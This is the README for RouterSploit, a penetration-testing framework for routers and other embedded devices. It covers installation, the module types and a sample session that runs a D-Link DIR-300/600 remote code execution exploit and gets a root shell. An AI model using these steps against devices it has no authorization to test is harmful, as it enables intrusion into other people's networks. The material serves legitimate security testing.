# RouterSploit - Router Exploitation Framework

The RouteSploit Framework is an open-source exploitation framework dedicated to embedded devices.

It consists of various modules that aids penetration testing operations:

- exploits - modules that take advantage of identified vulnerabilities
- creds - modules designed to test credentials against network services
- scanners - modules that check if target is vulnerable to any exploit

# Installation

	sudo apt-get install python-requests python-paramiko python-netsnmp
	git clone https://github.com/reverse-shell/routersploit
	./rsf.py

# Usage

## Run

	root@kalidev:~/git/routersploit# ./rsf.py 
	 ______            _            _____       _       _ _
	 | ___ \          | |          /  ___|     | |     (_) |
	 | |_/ /___  _   _| |_ ___ _ __\ `--. _ __ | | ___  _| |_
	 |    // _ \| | | | __/ _ \ '__|`--. \ '_ \| |/ _ \| | __|
	 | |\ \ (_) | |_| | ||  __/ |  /\__/ / |_) | | (_) | | |_
	 \_| \_\___/ \__,_|\__\___|_|  \____/| .__/|_|\___/|_|\__|
	                                     | |
	     Router Exploitation Framework   |_|

	 Dev Team : Marcin Bury (lucyoa) & Mariusz Kupidura (fwkz)
	 Codename : Wildest Dreams
	 Version  : 1.0.0

	rsf > 

## Pick the module

	rsf > use exploits/
	exploits/2wire/     exploits/asmax/     exploits/asus/      exploits/cisco/     exploits/dlink/     exploits/fortinet/  exploits/juniper/   exploits/linksys/   exploits/multi/     exploits/netgear/
	rsf > use exploits/dlink/dir_300_600_rce
	rsf (D-LINK DIR-300 & DIR-600 RCE) > 

U can use <tab> key for completion.

## Options

Display module options:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > show options

	Target options:


	   Name       Current settings     Description                                
	   ----       ----------------     -----------                                
	   target                          Target address e.g. http://192.168.1.1     
	   port       80                   Target Port

Set options:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > set target http://192.168.1.1
	[+] {'target': 'http://192.168.1.1'}

## Exploit

Exploiting target can be achieved by issuing 'run' or 'exploit' command:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > run
	[+] Target is vulnerable
	[*] Invoking command loop...
	cmd > whoami
	root

It is also possible to check if the target is vulnerable to particular exploit:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > check
	[+] Target is vulnerable

## Info

Display information about exploit:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > show info

	Name:
	D-LINK DIR-300 & DIR-600 RCE

	Description:
	Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.

	Targets:
	- D-Link DIR 300
	- D-Link DIR 600

	Authors:
	- Michael Messner <devnull[at]s3cur1ty.de> # vulnerability discovery
	- Marcin Bury <marcin.bury[at]reverse-shell.com> # routersploit module

	References:
	- http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router
	- http://www.s3cur1ty.de/home-network-horror-days
	- http://www.s3cur1ty.de/m1adv2013-003

# License

License has been taken from BSD licensing and applied to RouterSploit Framework.
Please see LICENSE for more details.

